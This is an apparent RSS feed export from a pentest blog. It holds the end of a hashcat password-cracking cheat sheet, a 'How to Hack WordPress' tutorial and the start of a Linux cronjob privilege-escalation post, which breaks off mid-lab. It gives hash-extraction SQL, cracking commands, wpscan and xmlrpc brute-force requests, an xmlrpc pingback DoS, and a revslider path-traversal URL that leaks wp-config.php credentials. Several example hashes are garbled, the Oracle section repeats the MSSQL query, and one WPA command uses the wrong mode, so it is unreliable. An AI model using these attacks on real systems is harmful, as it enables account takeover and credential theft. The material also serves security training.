+hashcat -m 11600 -a 3 hash.txt ?a?a?a?a?a?a<br />
+<strong>WORDLIST ATTACK</strong><br />
+hashcat -m 11600 -a 0 hash.txt dict.txt<br />
+<strong>WORDLIST + RULE ATTACK</strong><br />
+hashcat -m 11600 -a 0 hash.txt dict.txt -r rule.txt</p>
+<p><strong>BITCOIN / LITECOIN</strong></p>
+<p><strong>HASH FORMAT</strong><br />
+$bitcoin$96$d011alb6a8d675b7a36d0cd2efaca32a9f8dcld57d6d01a58399ea04e703e8bbb448<br />
+99039326f7a00fl71a7bbc854a54$16$1563277210780230$158555$96$628835426818227243334<br />
+570448571536352510740823233055715845322741625407685873076027233865346542174$66$6<br />
+25882875480513751851333441623702852811440775888122046360561760525<br />
+<strong>EXTRACT HASH</strong><br />
+bitcoin2john.py wallet.dat &gt; hash.txt<br />
+<strong>BRUTE FORCE ATTACK</strong><br />
+hashcat -m 11300 -a 3 hash.txt ?a?a?a?a?a?a<br />
+<strong>WORDLIST ATTACK</strong><br />
+hashcat -m 11300 -a 0 hash.txt dict.txt<br />
+<strong>WORDLIST + RULE ATTACK</strong><br />
+hashcat -m 11300 -a 0 hash.txt dict.txt -r rule.txt</p>
+<p><strong>MAC OS X 10.8-10.12</strong></p>
+<p><strong>HASH FORMAT</strong><br />
+username:$ml$35714$50973de90d336b5258f01e48ab324aa9ac81ca7959ac470d3d9c4395af624<br />
+398$631a0ef84081b37cfe594a5468cf3a63173cd2ec25047b89457ed300f2b41b30a0792a39912f<br />
+C5f3f7be8f74b7269ee3713172642de96ee482432a8dl2bf291a<br />
+<strong>EXTRACT HASH</strong><br />
+sudo plist2hashcat.py /var/db/dslocal/nodes/Default/users/&lt;username&gt;.plist<br />
+BRUTE FORCE ATTACKhashcat -m 122 -a 3 hash.txt ?a?a?a?a?a?a<br />
+<strong>WORDLIST ATTACK</strong><br />
+hashcat -m 122 -a 0 hash.txt dict.txt<br />
+<strong>WORDLIST + RULE ATTACK</strong><br />
+hashcat -m 122 -a 0 hash.txt dict.txt -r rule.txt</p>
+<p><strong>MYSQL4.1 / MYSQL5+ (DOUBLE SHA1)</strong></p>
+<p><strong>HASH FORMAT</strong><br />
+FCF7C1B8749CF99D88E5F34271D636178FB5D130<br />
+<strong>EXTRACT HASH</strong><br />
+SELECT user,password FROM mysql.user INTO OUTFILE ‘/tmp/hash.txt’;<br />
+<strong>BRUTE FORCE ATTACK</strong><br />
+hashcat -m 300 -a 3 hash.txt ?a?a?a?a?a?a<br />
+<strong>WORDLIST ATTACK</strong><br />
+hashcat -m 300 -a 0 hash.txt dict.txt<br />
+<strong>WORDLIST + RULE ATTACK</strong><br />
+hashcat -m 300 -a 0 hash.txt dict.txt -r rule.txt</p>
+<p><strong>POSTGRESQL</strong></p>
+<p><strong>HASH FORMAT</strong><br />
+a6343a68d964ca596d9752250d54bb8a:postgres<br />
+<strong>EXTRACT HASH</strong><br />
+SELECT username, passwd FROM pg_shadow;<br />
+<strong>BRUTE FORCE ATTACK</strong><br />
+hashcat -m 12 -a 3 hash.txt ?a?a?a?a?a?a<br />
+<strong>WORDLIST ATTACK</strong><br />
+hashcat -m 12 -a 0 hash.txt dict.txt<br />
+<strong>WORDLIST + RULE ATTACK</strong><br />
+hashcat -m 12 -a 0 hash.txt dict.txt -r rule.txt</p>
+<p><strong>MSSQL(2012), MSSQL(2014)</strong></p>
+<p><strong>HASH FORMAT</strong><br />
+0x02000102030434ealbl7802fd95ea6316bd61d2c94622ca3812793e8fbl672487b5c904a45a31b<br />
+2ab4a78890d563d2fcf5663e46fe797d71550494be50cf4915d3f4d55ec375<br />
+<strong>EXTRACT HASH</strong><br />
+SELECT SL.name,SL.password_hash FROM sys.sql_logins AS SL;<br />
+<strong>BRUTE FORCE ATTACK</strong><br />
+hashcat -m 1731 -a 3 hash.txt ?a?a?a?a?a?a<br />
+<strong>WORDLIST ATTACK</strong><br />
+hashcat -m 1731 -a 0 hash.txt dict.txt</p>
+<p><strong>WORDLIST + RULE ATTACK</strong><br />
+hashcat -m 1731 -a 0 hash.txt dict.txt -r rule.txt</p>
+<p><strong>ORACLE 11G</strong></p>
+<p><strong>HASH FORMAT</strong><br />
+ac5fle62d21fd0529428b84d42e8955b04966703:38445748184477378130<br />
+<strong>EXTRACT HASH</strong><br />
+SELECT SL.name,SL.password_hash FROM sys.sql_logins AS SL;<br />
+<strong>BRUTE FORCE ATTACK</strong><br />
+hashcat -m 112 -a 3 hash.txt ?a?a?a?a?a?a<br />
+<strong>WORDLIST ATTACK</strong><br />
+hashcat -m 112 -a 0 hash.txt dict.txt<br />
+<strong>WORDLIST + RULE ATTACK</strong><br />
+hashcat -m 112 -a 0 hash.txt dict.txt -r rule.txt</p>
+<p><strong>CISCO TYPE 4 (SHA256)</strong></p>
+<p><strong>HASH FORMAT</strong><br />
+2btjjy78REtmYkkW0csHUbDZOstRXoWdX1mGrmmfeHI<br />
+<strong>BRUTE FORCE ATTACK</strong><br />
+hashcat -m 5700 -a 3 hash.txt ?a?a?a?a?a?a<br />
+<strong>WORDLIST ATTACK</strong><br />
+hashcat -m 5700 -a 0 hash.txt dict.txt<br />
+<strong>WORDLIST + RULE ATTACK</strong><br />
+hashcat -m 5700 -a 0 hash.txt dict.txt -r rule.txt</p>
+<p><strong>CISCO TYPE 5 (MD5)</strong></p>
+<p><strong>HASH FORMAT</strong><br />
+$l$28772684$iEwN0gGugq09.bIz5sk8k/<br />
+<strong>BRUTE FORCE ATTACK</strong><br />
+hashcat -m 500 -a 3 hash.txt ?a?a?a?a?a?a<br />
+<strong>WORDLIST ATTACK</strong><br />
+hashcat -m 500 -a 0 hash.txt dict.txt<br />
+<strong>WORDLIST + RULE ATTACK</strong><br />
+hashcat -m 500 -a 0 hash.txt dict.txt -r rule.txt</p>
+<p><strong>CISCO TYPE 9 (SCRYPT)</strong></p>
+<p><strong>HASH FORMAT</strong><br />
+$9$2MJBozw/9R3UsU$21FhcKvpghcyw8deP25G0fyZaagyU0GBymkryv0dfo6<br />
+<strong>BRUTE FORCE ATTACK</strong><br />
+hashcat -m 9300 -a 3 hash.txt ?a?a?a?a?a?a<br />
+<strong>WORDLIST ATTACK</strong><br />
+hashcat -m 9300 -a 0 hash.txt dict.txt<br />
+<strong>WORDLIST + RULE ATTACK</strong><br />
+hashcat -m 9300 -a 0 hash.txt dict.txt -r rule.txt</p>
+<p><strong>WPA PSK / WPA2 PSK</strong></p>
+<p><strong>HASH FORMAT</strong><br />
+*Capture 4-way authentication handshake &gt; capture.cap<br />
+cap2hccapx.bin capture.cap capture_out.hccapx<br />
+<strong>BRUTE FORCE ATTACK</strong><br />
+hashcat -m 2500 -a 3 capture_out.hccapx ?a?a?a?a?a?a<br />
+<strong>WORDLIST ATTACK</strong><br />
+hashcat -m 2500 -a 3 capture_out.hccapx dict.txt<br />
+<strong>WORDLIST + RULE ATTACK</strong><br />
+hashcat -a 0 capture_out.hccapx dict.txt -r rule.txt</p>
+<p><span style="color: #800000;"><strong>ONLINE RESOURCES</strong></span></p>
+<p>HASHCAT<br />
+<a href="https://hashcat.net/wiki/">https://hashcat.net/wiki/</a><br />
+<a href="https://hashcat.net/wiki/doku.php?id=hashcat_utilshttps://hashcat.net/wiki/doku.php?id=statsprocessor">https://hashcat.net/wiki/doku.php?id=hashcat_utilshttps://hashcat.net/wiki/doku.php?id=statsprocessor</a><br />
+<a href="http://www.netmux.com/blog/ultimate-guide-to-cracking-foreign-character-passwords-using-has">http://www.netmux.com/blog/ultimate-guide-to-cracking-foreign-character-passwords-using-has</a><br />
+<a href="http://www.netmux.com/blog/cracking-12-character-above-passwords">http://www.netmux.com/blog/cracking-12-character-above-passwords</a></p>
+<p><strong>CRACKING RIGS</strong><br />
+<a href="http://www.netmux.com/blog/how-to-build-a-password-cracking-rig">http://www.netmux.com/blog/how-to-build-a-password-cracking-rig</a><br />
+<a href="https://www.unix-ninja.com/p/Building_a_Password_Cracking_Rig_for_Hashcat_-_Part_III">https://www.unix-ninja.com/p/Building_a_Password_Cracking_Rig_for_Hashcat_-_Part_III</a></p>
+<p><strong>EXAMPLE HASH GENERATION</strong><br />
+<a href="https://www.onlinehashcrack.com/hash-generator.php">https://www.onlinehashcrack.com/hash-generator.php</a><br />
+<a href="https://www.tobtu.com/tools.php">https://www.tobtu.com/tools.php</a><br />
+<a href="http://hash.online-convert.com/">http://hash.online-convert.com/</a><br />
+<a href="https://www.tools4noobs.com/online_tools/hash/">https://www.tools4noobs.com/online_tools/hash/</a><br />
+<a href="https://quickhash.com/">https://quickhash.com/</a><br />
+<a href="http://bitcoinvalued.com/tools.php">http://bitcoinvalued.com/tools.php</a><br />
+<a href="http://www.sha1-online.com/">http://www.sha1-online.com/</a><br />
+<a href="http://www.freeformatter.com/hmac-generator.html">http://www.freeformatter.com/hmac-generator.html</a><br />
+<a href="http://openwall.info/wiki/john/Generating-test-hashes">http://openwall.info/wiki/john/Generating-test-hashes</a></p>
+<p>OTHER<br />
+<a href="http://blog.thireus.com/cracking-story-how-i-cracked-over-122-million-sha1-and-md5-hashed-">http://blog.thireus.com/cracking-story-how-i-cracked-over-122-million-sha1-and-md5-hashed-</a><br />
+passwords/<br />
+<a href="http://www.utf8-chartable.de/">http://www.utf8-chartable.de/</a><br />
+<a href="http://thesprawl.org/projects/pack/">http://thesprawl.org/projects/pack/</a><br />
+<a href="https://blog.gotmilk.com/2011/06/dictionaries-wordlists/">https://blog.gotmilk.com/2011/06/dictionaries-wordlists/</a><br />
+<a href="http://wpengine.com/unmasked/">http://wpengine.com/unmasked/</a></p>
+<p><strong>NETMUX</strong><br />
+<a href="http://www.netmux.com/">http://www.netmux.com/</a><br />
+<a href="http://www.hashcrack.io/">http://www.hashcrack.io/</a><br />
+<a href="https://github.com/netmux">https://github.com/netmux</a><br />
+<a href="https://twitter.com/netmux">https://twitter.com/netmux</a><br />
+<a href="https://www.instagram.com/netmux/">https://www.instagram.com/netmux/</a></p>
+<p>If you&#8217;re reading this last line a huge thank&#8217;s and i&#8217;m gonna cover John the ripper to the nest blog it will contain all the screen shots of the all cracking methodology with commands and everything which left in hashcat.hope you learn something new,Thank you.</p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/password-cracking-with-hashcat/">Password Cracking with Hashcat</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.armourinfosec.com/password-cracking-with-hashcat/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>How to Hack WordPress ?</title>
+		<link>https://www.armourinfosec.com/how-to-hack-wordpress/</link>
+					<comments>https://www.armourinfosec.com/how-to-hack-wordpress/#respond</comments>
+		
+		<dc:creator><![CDATA[Armour Infosec]]></dc:creator>
+		<pubDate>Wed, 29 Jan 2020 13:28:05 +0000</pubDate>
+				<category><![CDATA[Enumeration]]></category>
+		<category><![CDATA[Penetration Testing]]></category>
+		<guid isPermaLink="false">https://www.armourinfosec.com/?p=25421</guid>
+
+					<description><![CDATA[<p>Attacking &#38; Exploitation Before starting with this blog firstly visit wordpress enumeration blog . Researchers discovered an ongoing malvertising (online...</p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/how-to-hack-wordpress/">How to Hack WordPress ?</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<h1>Attacking &amp; Exploitation</h1>
+<p>Before starting with this blog firstly visit <strong><a href="https://www.armourinfosec.com/wordpress-enumeration/">wordpress enumeration</a></strong> blog .</p>
+<p>Researchers discovered an ongoing malvertising (<span class="js-about-item-abstr">online advertising to spread malware.</span>)campaign targeting millions of WordPress websites to infect with backdoor and exploiting the various WordPress plugins vulnerabilities.According to WordPress, there are nearly 60 million Websites power by WordPress content management system and hundreds of WordPress Plugins are installed that developers by various developers around the globe. Cyber criminals launch the payload by exploiting the vulnerabilities that reside in some of the most popular WordPress plugins and injecting malicious scripts in unpatched WordPress website.</p>
+<p>Attacker: Kali Linux<br />
+Target: WordPress</p>
+<h5>Table Of Content</h5>
+<p>1.Brute-forcing wp-login.php form<br />
+2.Brute Force Login via xmlrpc.php<br />
+3.Denial of Service (DOS) via xmlrpc.php<br />
+4.Exploit WordPress Plugin<br />
+5.Exploit WordPress Theme Example<br />
+6.Sniff and Capture Credentials over non-secure login<br />
+7.Compromise Systems Administration Tools<br />
+8.Content Discovery<br />
+9.Vulnerable Server Software</p>
+<h3>1.Brute Force wp-login.php Form</h3>
+<p>The most common attack against the WordPress user is brute forcing the password of an account to gain access to the back-end of the WordPress system. Other ways a password can be compromised include sniffing the password in clear text over a HTTP login session or even getting the credentials from a key logger on the workstation of the WordPress administrator.Accounts with administrator level access are the most sought after due to the amount of mischief an admin user can get up to; adding PHP command shells or malicious javascript directly through admin interface are common examples.</p>
+<p>With the usernames we collected during information gathering we can get started (or just try admin). Take a look at the login form <strong>/wp-login.php</strong>, notice how failed logins confirm the username when an incorrect password is entered. This is very helpful to an attacker&#8230;. it also makes things more user friendly for the end user who has forgotten their username and password. This &#8220;feature&#8221; has been debated and it has been decided to keep this response within the WordPress code.<br />
+Brute forcing accounts of users is possible using a number of open source tools. In addition there are worm like scripts available that have spread through the WordPress ecosystem, searching for and spreading to WordPress sites with weak admin passwords.</p>
+<h5>WPScan</h5>
+<p>The previously mentioned WPScan tool in addition to enumeration, can also perform brute force login attacks.</p>
+<pre class="theme:familiar lang:sh decode:true">wpscan --url example.com --wordlist /usr/share/wordlist/rockyou.txt --username testuser --threads 20</pre>
+<h5>Nmap NSE Script</h5>
+<p>Nmap the port scanner can do much more than find open ports. Recent versions of Nmap come bundled with NSE scripts that can be used to test many different vulnerabilities; including enumerating users and brute forcing WordPress passwords.</p>
+<pre class="theme:familiar lang:sh decode:true">nmap -sV --script http-wordpress-enum --script-args limit=25 example.com
+
+PORT STATE SERVICE REASON
+80/tcp open http syn-ack
+| http-wordpress-enum:
+| Username found: admin
+| Username found: testadmin
+| Username found: fred
+| Username found: alice
+| Username found: bob
+|_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-enum.limit'</pre>
+<h5>Burp Suite</h5>
+<p>For those familiar with web application security testing, the Burp Suite Intruder tool can also be used for brute-forcing WordPress passwords. A WordPress login attempt is only a HTTP POST request after all.Configure Burp Intruder to send a valid username (or a list of usernames) along with a list of possible passwords and wait for the successful login.</p>
+<h3><img decoding="async" class="alignnone wp-image-25431" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/edit.png" alt="" width="650" height="294" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/edit.png 546w, https://www.armourinfosec.com/wp-content/uploads/2020/01/edit-300x136.png 300w" sizes="(max-width: 650px) 100vw, 650px" /></h3>
+<h3>2.Brute Force Login using xmlrpc.php</h3>
+<p>The xmlrpc.php capability is an API endpoint that allows mobile apps and other programmable access to backend functions of the WordPress site such as publishing posts. It is enabled by default and several attacks are possible against the endpoint depending on permissions and the version of the target WordPress installation.<br />
+By using the xmlrpc.php endpoint to attack WordPress accounts we may bypass security plugins that are protecting the login form from abuse. This password guessing attack may also be faster, with the result being you can attempt more passwords.</p>
+<p>Notice the -d, in curl this is the data that is sent as part of the POST request. You could also use Burp or your favorite scripting language for this request.</p>
+<pre class="theme:familiar lang:sh decode:true">curl -X POST -d "&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;admin&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;pass&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;" http://examplewp.com/xmlrpc.php</pre>
+<p>In the response we will see an invalid password response or success. It is easy to spot and work into your script.</p>
+<h3>3.Denial of Service (DOS) via xmlrpc.php</h3>
+<p>Another use of the xmlrpc.php endpoint is to perform a denial of service attack. If this capability is enabled, we can send a small request to the server and get it to respond with a full page of content to a target of our choosing. The idea is to make multiple requests from different systems and get them all to target a single host. Potentially knocking it offline due to network congestion.</p>
+<p>First, we enumerate the capabilities of the xmlrpc.php endpoint.</p>
+<pre class="theme:familiar lang:sh decode:true">curl -X POST -d "&lt;methodCall&gt;&lt;methodName&gt;system.listMethods&lt;/methodName&gt;&lt;params&gt;&lt;/params&gt;&lt;/methodCall&gt;" http://examplewp.com/xmlrpc.php
+The response will be a list of available methods.
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;methodResponse&gt;
+&lt;params&gt;
+&lt;param&gt;
+&lt;value&gt;
+&lt;array&gt;&lt;data&gt;
+&lt;value&gt;&lt;string&gt;system.listMethods&lt;/string&gt;&lt;/value&gt;
+&lt;value&gt;&lt;string&gt;system.getCapabilities&lt;/string&gt;&lt;/value&gt;
+&lt;value&gt;&lt;string&gt;pingback.extensions.getPingbacks&lt;/string&gt;&lt;/value&gt;
+&lt;value&gt;&lt;string&gt;pingback.ping&lt;/string&gt;&lt;/value&gt;
+&lt;value&gt;&lt;string&gt;mt.publishPost&lt;/string&gt;&lt;/value&gt;
+**** truncated ****</pre>
+<p>Note the pingback.ping indicating pingback is enabled. Use the following data for the pingback attempt.</p>
+<pre class="theme:familiar lang:default decode:true">&lt;methodCall&gt;
+&lt;methodName&gt;pingback.ping&lt;/methodName&gt;
+&lt;params&gt;&lt;param&gt;
+&lt;value&gt;&lt;string&gt;
+&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://**blog-url-from-wp**&lt;/string&gt;
+&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;
+&lt;/methodCall&gt;</pre>
+<p>Disabling access to xmlrpc.php from your web server or using .htaccess is recommended if you are not using the API. Not only will it block any attacks, it will reduce the amount of noise in your logs from the bots attempting to hit these API endpoints.</p>
+<h3>4.Exploit WordPress Plugin</h3>
+<p>Plugins, Themes and WordPress Core all contain a large amount of PHP code from developers around the world. These developers have differing abilities and focus when it comes to writing secure software. For this reason, there are thousands of exploitable vulnerabilities available to an attacker. Updating plugins, the WordPress core, and themes must be a routine task for any WordPress administrator to ensure the known vulnerabilities are patched.Common vulnerabilities include XSS, SQL injection, file upload, and code execution. All of these can have devastating consequences to a WordPress site. Search through Metasploit and exploit-db.com for exploitable WordPress bugs.</p>
+<p><strong>Revslider Example Exploit</strong></p>
+<p>An example of a WordPress plugin exploit is from a vulnerability discovered 5 years ago. The vulnerable revslider plugin resulted in tens of thousands of compromised WordPress sites. To this day, there are attempts to exploit it in our web server logs even in 2019. One reason it was such a popular plugin is that it was bundled with many themes.</p>
+<p>A number of exploitation opportunities are possible, but this is perhaps the easiest to demonstrate. Exploitation is as difficult as loading this URL in a browser.</p>
+<pre class="theme:familiar lang:sh decode:true">https://example.com/wp-admin/admin-ajax.php?action=revslider_show_image&amp;img=../wp-config.php</pre>
+<p>The HTTP request would download the <strong>wp-config.php</strong> file from the vulnerable site if it had the exploitable version of revslider installed. The exploit type is known as a local file include, as the attacker is tricking the application code into including a sensitive file in the output. The <strong>wp-config.php</strong> is not normally accessible and contains the database credentials for the <strong>WordPress database user.</strong></p>
+<p>With the database password, an attacker could attempt to login as the WordPress admin using the same password (if passwords were re-used). A more common attack vector would be to login to the phpmyadmin script, if installed, as this uses the database credentials. If MySQL is exposed, it may even possible to directly connect to the database using a MySQL database client and the leaked credentials.</p>
+<p>Access to the database provides the attacker options to reset the administrator password, attempt to crack the admin hash, modify content in the database adding malicious js or iframes. There are many possibilities for further exploitation once the credentials in wp-config.php are leaked.</p>
+<h3>5.Exploit WordPress Theme Example</h3>
+<p>Exploits are available from various places and forums. This example uses an exploit from the popular Metasploit Exploitation Framework. The vulnerable theme is the very popular optimize press. The vulnerability was released back in 2013 and versions after 1.45 are not vulnerable to this exploit.Numerous bots and automated attack scripts that exploit WordPress sites do not perform the enumeration phase, they simply propel exploits at thousands of sites and hope for a successful payload.Plugins and themes not enabled can be exploited. Scanning for default locations of those vulnerable files is a highly common attack by automated bots.</p>
+<h3><img decoding="async" class="alignnone wp-image-25423 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/wp2.jpg" alt="" width="900" height="550" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/wp2.jpg 900w, https://www.armourinfosec.com/wp-content/uploads/2020/01/wp2-300x183.jpg 300w, https://www.armourinfosec.com/wp-content/uploads/2020/01/wp2-768x469.jpg 768w" sizes="(max-width: 900px) 100vw, 900px" /><br />
+6.Sniff and Capture Credentials over non-secure login</h3>
+<p>Without additional security measures in place (TLS/SSL), accessing the /wp-admin/ dashboard is over an unencrypted connection. This means if you log in to your WordPress site on an unsecured network, such as the wireless at your local coffee shop or airport, your login and password to manage the site could be captured by an attacker watching your session.</p>
+<p>In this example Wireshark capture we can clearly see the username and password being captured in our POST request to wp-login.php.<br />
+<img decoding="async" class="alignnone wp-image-25424 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/wp1.png" alt="" width="900" height="265" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/wp1.png 900w, https://www.armourinfosec.com/wp-content/uploads/2020/01/wp1-300x88.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/01/wp1-768x226.png 768w" sizes="(max-width: 900px) 100vw, 900px" /></p>
+<h3>7.Compromise Systems Administration Tools</h3>
+<p>A successful password guessing attack against a server management account will give an attacker full access to the server and the WordPress application.Services that can be attacked with brute force password guessing include:</p>
+<pre class="theme:familiar lang:css decode:true">&gt;SSH Service
+&gt;MySQL database service
+&gt;Webmin Server Management
+&gt;CPanel or WHCMS Web Hosting Control Panels
+&gt;phpMyAdmin database management application</pre>
+<p>Reduce the chance of management account compromise:</p>
+<pre class="theme:familiar lang:coffee decode:true">&gt;Use strong passwords everywhere, do not re-use them!
+&gt;Move SSH to a different port
+&gt;Use TLS/SSL for web based management services to prevent sniffing and credential compromise
+&gt;White list IP addresses that are able to connect to Internet facing services</pre>
+<h3>8.Content Discovery</h3>
+<p>Content Discovery is the process of attempting to find items of interest in a web path. It applies to any web application, but since we are attacking WordPress, target it towards typical files and paths of interest in a WordPress installation.</p>
+<p>For example:</p>
+<pre class="theme:familiar lang:css decode:true ">curl https://example.com/wp-config.php.bak
+curl https://example.com/.wp-config.php.swp</pre>
+<p>These two examples are using curl to find a possible backup file of the wp-config.php file that we discussed earlier, as it contains sensitive information including database credentials. The second attempt tries to download the backup file that vim automatically creates when it is editing a file. A good reason not to edit files directly on your production sites!</p>
+<p>Using curl to perform this search task for hundreds or even thousands of common files could be accomplished with a little bit of scripting. On the other hand, more appropriate tools such as Burp Suite, or gobuster, a tool that is very fast due to its parallel processing, will do a much better job.</p>
+<h3>9.Vulnerable Server Software</h3>
+<p>Testing the WordPress application itself is only one part of ensuring your web site is secure. The server that hosts the website must also be kept secure.Exploitable security vulnerabilities can, of course, be present in server software or the operating system. Examples can be found on any vulnerability mailing list. Recently a remote code execution vulnerability was found in Exim one of the most popular mail delivery servers on the Internet. <strong>PHPMyAdmin</strong> is a popular application to attack, due to its popularity and a long list of vulnerabilities.<br />
+Server Software Misconfiguration</p>
+<p>Even if no exploitable vulnerability is present, a simple misconfiguration can leave a service vulnerable. Often security vulnerabilities are introduced simply through a misconfiguration by an overworked system administrator.</p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/how-to-hack-wordpress/">How to Hack WordPress ?</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.armourinfosec.com/how-to-hack-wordpress/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Linux Privilege Escalation by Exploiting Cronjobs</title>
+		<link>https://www.armourinfosec.com/linux-privilege-escalation-by-exploiting-cronjobs/</link>
+					<comments>https://www.armourinfosec.com/linux-privilege-escalation-by-exploiting-cronjobs/#respond</comments>
+		
+		<dc:creator><![CDATA[Armour Infosec]]></dc:creator>
+		<pubDate>Tue, 28 Jan 2020 16:42:58 +0000</pubDate>
+				<category><![CDATA[Penetration Testing]]></category>
+		<category><![CDATA[Privilege Escalation]]></category>
+		<category><![CDATA[cronjob]]></category>
+		<category><![CDATA[cronjob exploitation]]></category>
+		<category><![CDATA[linux]]></category>
+		<category><![CDATA[privilege escalation]]></category>
+		<guid isPermaLink="false">https://www.armourinfosec.com/?p=25398</guid>
+
+					<description><![CDATA[<p>In this blog I will share procedure to enumerate and exploit Cronjob. Before going for exploitation of cronjob we are...</p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/linux-privilege-escalation-by-exploiting-cronjobs/">Linux Privilege Escalation by Exploiting Cronjobs</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>In this blog I will share procedure to enumerate and exploit <strong>Cronjob</strong>. Before going for exploitation of cronjob we are going to find the answer for the question</p>
+<h5><strong>“What is Cronjob ?”</strong></h5>
+<p><strong>Cron</strong> is a utility that allows Linux users to do specific task on the server at a given time and date.Consider system admin is required to take the backup of server at regular interval. It means system admin has to do repeated task at certain interval.This repeated task at certain interval can be automated in Linux using cron utility. This automated repeated task is known as cronjob and a table or file that maintain this cronjob is known as crontab. Linux maintains separate crontab for each and every user.Given below is the syntax to define a cronjob in <strong>crontab</strong>.</p>
+<p><img decoding="async" class="alignnone wp-image-25365" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/1.png" alt="" width="610" height="285" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/1.png 699w, https://www.armourinfosec.com/wp-content/uploads/2020/01/1-300x140.png 300w" sizes="(max-width: 610px) 100vw, 610px" /></p>
+<p>A single line in the crontab represent a cronjob. Cronjob is divided into three parts. All three parts are described below.</p>
+<h5>When to perform cronjob ?</h5>
+<p>First five numeric value represents the time of execution of the cronjob. Now let&#8217;s understand the five numeric value.</p>
+<ul>
+<li>Minute  &#8211;  First value represents minute ranges between 0 to 59 and * means any minute.</li>
+<li>Hour      &#8211; Second value represent Hour ranges between 0 to 24 and * means any hour.</li>
+<li>Day of month  &#8211; Third value represents day of month ranges between 1 to 31 and * means any day.</li>
+<li>Month  &#8211; Fourth value represents month ranges between 1 to 12 and * means any month.</li>
+<li>Day of week  &#8211; Fifth value represents the day of week ranges between 0 to 6 starting from Sunday and * means any day of week.</li>
+</ul>
+<h5>By whom privileges does the task perform ?</h5>
+<p>The value Just after the numeric value represents the user whose privileges will be used to accomplish the task.</p>
+<h5>Which command to be execute ?</h5>
+<p>After defining the user we need to provide the command to be executed at that time.<br />
+I hope we found our answer and now we will learn to escalate privileges through cronjob. For better understanding i am dividing further blog into two parts Enumeration and Exploitation.</p>
+<h4>Cronjob Enumeration</h4>
+<p>Lets start with the enumeration of the cronjob. The cronjob enumeration includes, finding and understanding the task that cronjob was assinged.There are following types of cronjob that we have to find.</p>
+<h5>User based Cronjob</h5>
+<p>In Linux each and every user can perform cronjobs. Each and every user maintains a crontab for their cronjobs. The location of the crontab of each user is in the following directory.</p>
+<pre class="theme:familiar lang:sh decode:true">/var/spool/cron/crontabs/'crontab_of_the_each_user_named_as_their_username'</pre>
+<p>The above directory is only accessible through root user. Normal user can check their cronjobs using command.</p>
+<pre class="theme:familiar lang:sh decode:true ">crontab -l</pre>
+<h5>Application based Cronjob</h5>
+<p>Certain application in Linux uses cronjob to perform their task. All the cronjobs that are created by any application is placed in the following directory.</p>
+<pre class="theme:familiar lang:sh decode:true ">/etc/cron.d</pre>
+<h5>Anacron</h5>
+<p>Anacron is defined as the cron with ability to performed the task that are skipped due to some reasons.This type of cronjob are placed in the following directory.</p>
+<pre class="theme:familiar lang:sh decode:true ">/etc/anacrontab</pre>
+<p>Above three are the possible ways to find the cronjobs. Now for understanding them only thing you have to do is read them.</p>
+<p><strong>Pro tip : If you want to know about the cronjobs of the other user then you can use the tool pspy(pspy32 for 32 bit and pspy64 for 64bit).</strong></p>
+<p>Download link : <a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></p>
+<h4>Cronjob Exploitation</h4>
+<p>From the above phase you found a cronjob and understands the working of the same.Now there are two possible ways to exploit the cronjob. There may be more!!!</p>
+<p>For following demonstration I am using <strong>CentOS</strong> as target of evaluation and <strong>Kali Linux</strong> as attacker system.</p>
+<h5>File Overwrite</h5>
+<p><strong>Situation where the vulnerability arises :</strong></p>
+<p>When a user defines a cronjob that runs a script, that script is writable by attacker then attacker can go for the file overwrite. Now consider a situation where sysadmin defines a cronjob that clears all files in /tmp/demo directory every 2 min. We will setup lab for the same situation and will exploit it.</p>
+<p><strong>Setting up the lab with same vulnerability :</strong></p>
+<p>I had created a demo directory in <strong>tmp</strong> and placed some files in it (demo).</p>
+<pre class="theme:familiar lang:sh decode:true">pwd
+touch 1.txt 2.txt 3.txt 4.php
+ls</pre>
+<p><img decoding="async" class="alignnone wp-image-25371" src="https://www.armourinfosec.com/wp-content/uploads/2020/01/2-2.png" alt="" width="610" height="141" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/01/2-2.png 607w, https://www.armourinfosec.com/wp-content/uploads/2020/01/2-2-300x69.png 300w" sizes="(max-width: 610px) 100vw, 610px" /></p>
+<p>Now lets create a python script to delete all files from demo and setting permissions to the file.</p>
+<pre class="theme:familiar lang:sh decode:true">cat cleanup.py
+chmod 777 cleanup.py</pre>
